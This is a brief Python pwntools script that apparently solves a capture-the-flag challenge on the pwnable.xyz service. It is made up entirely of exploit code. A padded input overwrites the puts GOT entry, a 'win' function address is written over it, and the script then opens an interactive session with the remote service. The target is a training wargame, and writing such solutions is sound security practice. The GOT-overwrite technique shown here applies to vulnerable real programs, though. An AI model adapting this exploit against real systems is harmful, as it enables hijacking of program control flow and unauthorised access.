from pwn import *


#sh = process('./challenge')

sh = remote('svc.pwnable.xyz', 30016)


puts_got = 0x601220
sh.sendlineafter('> ', '1')
sh.sendlineafter('? ', '50')
sh.sendlineafter(': ', "A"*0x20 + p64(puts_got))


win = 0x40093c
sh.sendlineafter('> ', '2')
sh.sendlineafter(': ', p64(win))


sh.sendlineafter('> ', '5')
sh.interactive()
